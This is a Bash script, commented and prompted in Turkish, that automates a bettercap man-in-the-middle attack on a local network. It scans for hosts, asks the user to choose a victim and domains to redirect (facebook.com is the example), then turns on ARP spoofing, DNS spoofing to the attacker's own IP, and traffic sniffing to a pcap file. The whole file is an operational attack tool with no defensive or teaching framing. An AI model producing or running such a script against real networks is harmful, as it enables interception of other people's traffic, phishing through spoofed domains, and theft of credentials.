#!/bin/bash

# Renkli çıktı için fonksiyonlar
info() { echo -e "\e[34m[INFO]\e[0m $1"; }
warn() { echo -e "\e[33m[WARN]\e[0m $1"; }
good() { echo -e "\e[32m[OK]\e[0m $1"; }

# Ağ arayüzü tespiti
iface=$(ip route | grep default | awk '{print $5}')
good "Kullanılan ağ arayüzü: $iface"

# Bettercap yüklü mü?
if ! command -v bettercap &> /dev/null; then
  warn "bettercap yüklü değil, kurulum başlatılıyor..."
  sudo apt install bettercap -y
fi

# Ağ taraması başlat
info "Ağ taraması yapılıyor (5 saniye)..."
sudo bettercap -iface "$iface" -eval "net.probe on; sleep 5; net.show" > bettercap_output.txt &
sleep 6

# Hedef IP seçimi
grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" bettercap_output.txt | sort -u | nl
echo
read -p "Saldırmak istediğin hedefin numarasını seç (1,2...): " target_num
target_ip=$(grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" bettercap_output.txt | sort -u | sed -n "${target_num}p")

good "Hedef seçildi: $target_ip"

# DNS spoof için hedef domainler
read -p "Yönlendirmek istediğin alan ad(lar)ı (örn: facebook.com): " spoof_domains

# MITM Başlatılıyor
info "Bettercap MITM saldırısı başlatılıyor..."

sudo bettercap -iface "$iface" -eval "
set arp.spoof.targets $target_ip;
arp.spoof on;
set dns.spoof.domains $spoof_domains;
set dns.spoof.address $(hostname -I | awk '{print $1}');
dns.spoof on;
set net.sniff.output mitm.pcap;
net.sniff on;
"
